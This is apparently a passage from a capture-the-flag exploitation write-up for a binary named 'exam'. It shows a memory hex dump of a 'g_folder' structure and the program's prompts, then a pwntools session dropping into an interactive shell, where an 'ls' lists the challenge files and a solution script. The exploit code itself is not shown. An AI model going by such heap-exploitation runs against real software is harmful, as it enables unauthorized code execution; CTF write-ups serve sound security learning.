5555557571a0  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
5555557571b0  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
5555557571c0  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
5555557571d0  00 00 00 00  00 00 00 00  31 0e 02 00  00 00 00 00  │····│····│1···│····│
5555557571e0  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
5555557571f0  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
555555757200
*** 0x555555756040 : g_folder ***
555555756040  10 70 75 55  55 55 00 00  c0 70 75 55  55 55 00 00  │·puU│UU··│·puU│UU··│
555555756050  a0 70 75 55  55 55 00 00  00 00 00 00  00 00 00 00  │·puU│UU··│····│····│
555555756060  00 00 00 00  00 00 00 00  a0 70 75 55  55 55 00 00  │····│····│·puU│UU··│
555555756070  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
555555756080
You're allowed to bring one summary. Which one is it?
>
Cheeky little fella. Screw math, you deserve a straight A!

[*] Switching to interactive mode
$
$ ls -l
total 6984
-rw------- 1 hackability hackability 4476928 Oct 22 13:25 core
-rwxrwxrwx 1 hackability hackability   13304 Oct 16 17:47 exam
-rwxrwxrwx 1 hackability hackability  764089 Oct 17 07:33 exam-327eaa2293629d8fe9588d9dde1025be.zip
-rwxrwxrwx 1 hackability hackability 1868984 Oct 16 17:47 libc.so.6
-rw-rw-r-- 1 hackability hackability    1371 Oct 22 14:37 sol_exam.py
-rwxrwxr-x 1 hackability hackability    8768 Oct 22 11:56 test
-rw-rw-r-- 1 hackability hackability    2062 Oct 22 12:26 test.c
```
